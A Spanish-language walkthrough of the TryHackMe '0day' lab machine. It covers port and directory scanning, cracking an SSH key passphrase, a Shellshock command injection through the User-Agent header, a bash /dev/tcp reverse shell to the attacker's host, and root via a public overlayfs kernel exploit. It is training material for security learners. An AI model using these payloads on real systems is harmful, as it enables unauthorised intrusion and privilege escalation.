---
title: "0day | TryHackMe"
date: 2023-09-08T02:01:58+05:30
description: "0day es una sala para principiantes-intermedios en Tryhackme.  El objetivo final es obtener el indicador de usuario y raíz."
tags: [tryhackme, shellshock, kernel-exploit]
---


## Escaneo de puertos

Usamos nmap para verificar los puertos abiertos

```bash
$ nmap -p- -Pn -n  -sVC --min-rate 2000  10.10.125.117

Nmap scan report for 10.10.125.117
Host is up (0.29s latency).
Not shown: 65507 closed tcp ports (reset), 26 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 5720823c62aa8f4223c0b893996f499c (DSA)
|   2048 4c40db32640d110cef4fb85b739bc76b (RSA)
|   256 f76f78d58352a64dda213c5547b72d6d (ECDSA)
|_  256 a5b4f084b6a78deb0a9d3e7437336516 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-title: 0day
|_http-server-header: Apache/2.4.7 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


## Web

Al tener el puerto 80 abierto, vemos su web


{{< figure src="https://i.imgur.com/SBtAtmk.png">}}

no hay nada interesante en el código fuente, asi que hacemos un escaneo de directorios con `dirsearch`


```bash
$ dirsearch -u http://10.10.125.117 -t 90

[20:57:03] 200 -    0B  - /admin/?/login
[20:57:04] 200 -    0B  - /admin/                                           
[20:57:04] 200 -    0B  - /admin/index.html                                 
[20:57:18] 301 -  314B  - /backup  ->  http://10.10.125.117/backup/         
[20:57:18] 200 -    2KB - /backup/                                          
[20:57:23] 403 -  288B  - /cgi-bin/                                         
[20:57:23] 301 -  315B  - /cgi-bin  ->  http://10.10.125.117/cgi-bin/       
[20:57:23] 200 -   13B  - /cgi-bin/test.cgi                                 
[20:57:26] 301 -  311B  - /css  ->  http://10.10.125.117/css/               
[20:57:42] 301 -  311B  - /img  ->  http://10.10.125.117/img/               
[20:57:43] 200 -    3KB - /index.html                                       
[20:57:46] 200 -  928B  - /js/                                              
[20:58:14] 200 -   38B  - /robots.txt                                       
[20:58:15] 403 -  294B  - /server-status/                                   
[20:58:15] 403 -  293B  - /server-status                                    
[20:58:15] 301 -  314B  - /secret  ->  http://10.10.125.117/secret/         
[20:58:15] 200 -  109B  - /secret/


```

Primero revisamos la dirección `http://10.10.125.117/backup/` y encontramos una llave `rsa`



{{< figure src="https://i.imgur.com/QDLOHmr.png">}}

la guardamos y probamos a descifrarla con fuerza bruta, en este caso usaremos `John-the-ripper`

```bash

$ ssh2john key > key.hash
$ john key.hash

Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
No password hashes left to crack (see FAQ)

$ john key.hash --show
key:letmein

1 password hash cracked, 0 left
```

Ya tenemos la password, ahora viendo la pagina de inicio vemos un nombre el nombre ryan, probamos ese usuario


```bash
$ chmod 600 key
$ ssh -i key ryan@10.10.125.117

Enter passphrase for key 'key': 
sign_and_send_pubkey: no mutual signature supported
ryan@10.10.125.117's password:


```

Y no funciono, vemos los demás directorios, em especial este `http://10.10.125.117/cgi-bin/test.cgi`

## Shellshock

Shellshock es una vulnerabilidad asociada al CVE-2014-6271 que salió el 24 de septiembre de 2014 y afecta a la shell de Linux “Bash” hasta la versión 4.3. Esta vulnerabilidad permite una ejecución arbitraria de comandos. [Ver más](https://deephacking.tech/shellshock-attack-pentesting-web/)


```bash
$ curl -X GET http://10.10.125.117/cgi-bin/test.cgi  -H "User-Agent: () { :;}; echo; /bin/bash -c  id" -i  
HTTP/1.1 200 OK
Date: Sat, 09 Sep 2023 02:41:10 GMT
Server: Apache/2.4.7 (Ubuntu)
Transfer-Encoding: chunked

uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

Pasamos comandos a través del User-Agent y como vemos tenemos un `RCE`


## Reverse Shell


```bash
$ curl -X GET http://10.10.125.117/cgi-bin/test.cgi  -H "User-Agent: () { :;}; echo; /bin/bash -i >& /dev/tcp/10.2.55.245/443 0>&1" -i

$ sudo nc -nvlp 443
listening on [any] 443 ...
connect to [10.2.55.245] from (UNKNOWN) [10.10.125.117] 38734
bash: cannot set terminal process group (871): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ubuntu:/usr/lib/cgi-bin$ 

```

Listamos los archivos dentro del usuario ryan, tenemos permisos de lectura en el archivo `user.txt`

```bash
www-data@ubuntu:/home/ryan$ ls -la
ls -la
total 28
drwxr-xr-x 3 ryan ryan 4096 Sep  2  2020 .
drwxr-xr-x 3 root root 4096 Sep  2  2020 ..
lrwxrwxrwx 1 ryan ryan    9 Sep  2  2020 .bash_history -> /dev/null
-rw-r--r-- 1 ryan ryan  220 Sep  2  2020 .bash_logout
-rw-r--r-- 1 ryan ryan 3637 Sep  2  2020 .bashrc
drwx------ 2 ryan ryan 4096 Sep  2  2020 .cache
-rw-r--r-- 1 ryan ryan  675 Sep  2  2020 .profile
-rw-rw-r-- 1 ryan ryan   22 Sep  2  2020 user.txt
www-data@ubuntu:/home/ryan$ cat user.txt
cat user.txt
THM{******************r0ckz}
www-data@ubuntu:/home/ryan$ 


```


## Root

Después de un rato de buscar scripts, la vulnerabilidad estaba muy cerca, usamos el comando `uname -a` y vemos que la version del kernel es vulnerable


```bash
www-data@ubuntu:/home/ryan$ uname -a
uname -a
Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux


```

Hay un exploit del kernel disponible públicamente. Aquí está el enlace para el [exploit](https://www.exploit-db.com/exploits/37292)

Descargue el exploit a la máquina local y transfiéralo a la máquina remota. Intenté ejecutar el exploit pero hay algo extraño... arroja un error. 

```bash
www-data@ubuntu:/tmp$ gcc ofs.c -o ofs
gcc ofs.c -o ofs
gcc: error trying to exec 'cc1': execvp: No such file or directory

```

Para solucionar este problema, necesitamos alinear nuestra variable PATH con una PATH estándar de Ubuntu, lo cual hacemos con el siguiente comando

```bash
www-data@ubuntu:/tmp$ echo $PATH
echo $PATH
/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
www-data@ubuntu:/tmp$ export PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.
<t PATH=/usr/local/bin:/usr/local/sbin:/usr/bin:/usr/sbin:/bin:/sbin:.       
www-data@ubuntu:/tmp$ gcc ofs.c -o ofs
gcc ofs.c -o ofs


```

Ya con eso, es solo ejecutar el exploit


```bash
www-data@ubuntu:/tmp$ ./ofs
./ofs
spawning threads
mount #1
mount #2
child threads done
/etc/ld.so.preload created
creating shared library
sh: 0: can't access tty; job control turned off
# cat /root/root.txt
THM{g************d}


```
